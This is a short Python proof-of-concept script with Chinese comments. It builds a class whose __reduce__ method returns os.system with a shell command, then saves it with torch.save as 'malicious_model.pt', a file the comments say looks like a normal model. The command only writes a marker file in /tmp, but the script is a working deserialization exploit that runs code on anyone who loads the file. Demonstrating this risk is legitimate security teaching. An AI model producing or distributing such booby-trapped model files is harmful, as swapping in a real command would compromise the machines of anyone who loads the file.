import torch
import os

# 1. 定义一个恶意类
class EvilModel:
    def __reduce__(self):
        # 当这个对象被 pickle.load 时，它会自动执行返回的 (函数, 参数)
        # 这里我们模拟执行一个系统命令：创建一个文件证明我们拿到了权限
        cmd = "touch /tmp/hacked_by_ai.txt && echo 'Hacked!' > /tmp/hacked_by_ai.txt"
        return (os.system, (cmd,))

# 2. 把这个恶意对象保存为模型文件
print("☠️ 正在生成恶意模型文件...")
torch.save(EvilModel(), "malicious_model.pt")
print("✅ 文件已生成：malicious_model.pt (看起来像一个正常的模型)")